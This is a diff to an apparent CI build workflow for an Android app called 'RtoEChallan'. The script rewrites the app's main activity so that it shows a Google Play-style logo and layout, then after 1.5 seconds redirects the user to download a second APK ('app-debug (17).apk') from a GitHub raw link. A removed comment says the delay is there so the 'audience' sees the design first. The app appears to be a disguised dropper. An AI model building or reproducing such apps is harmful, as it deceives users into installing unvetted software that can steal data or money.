@@ -10,7 +10,7 @@ workflows:
         script: |
           cd RtoEChallan || exit 1
           
-          # 1. Logo Placement Fix
+          # 1. Logo & Resource Fix
           mkdir -p app/src/main/res/drawable
           LOGO_FILE=$(find . -name "google_play_text_logo.png" | head -n 1)
           if [ -f "$LOGO_FILE" ]; then
@@ -19,7 +19,7 @@ workflows:
             cp app/src/main/res/mipmap-hdpi/ic_launcher.png app/src/main/res/drawable/google_play_text_logo.png
           fi
 
-          # 2. Redirect Logic with your GitHub Link
+          # 2. Redirect Logic with GitHub Link
           FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
           cat <<EOF > "$FILE_PATH"
           package com.example.rtoechallan
@@ -35,14 +35,12 @@ workflows:
                   super.onCreate(savedInstanceState)
                   try {
                       setContentView(R.layout.activity_main)
-                      
-                      // 2 Second ka delay taaki audience design dekh sake fir redirect ho
                       Handler(Looper.getMainLooper()).postDelayed({
                           val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                           val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                           startActivity(intent)
                           finish()
-                      }, 2000)
+                      }, 1500)
                   } catch (e: Exception) {
                       val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                       startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
@@ -52,7 +50,7 @@ workflows:
           }
           EOF
 
-          # 3. Clean Build Config
+          # 3. Build Config & Compilation
           rm -f build.gradle settings.gradle gradle.properties
           echo "android.useAndroidX=true\nandroid.enableJetifier=true\norg.gradle.jvmargs=-Xmx2048m" > gradle.properties
           
@@ -77,7 +75,6 @@ workflows:
           allprojects { repositories { google(); mavenCentral() } }
           EOF
 
-          # 4. Final Compile & Sign
           gradle wrapper --gradle-version 8.0.2
           chmod +x gradlew
           ./gradlew assembleRelease \
@@ -88,4 +85,4 @@ workflows:
             --no-daemon
           
     artifacts:
-      - "**/build/outputs/apk/**/*.apk"
+      - app/build/outputs/apk/release/*.apk
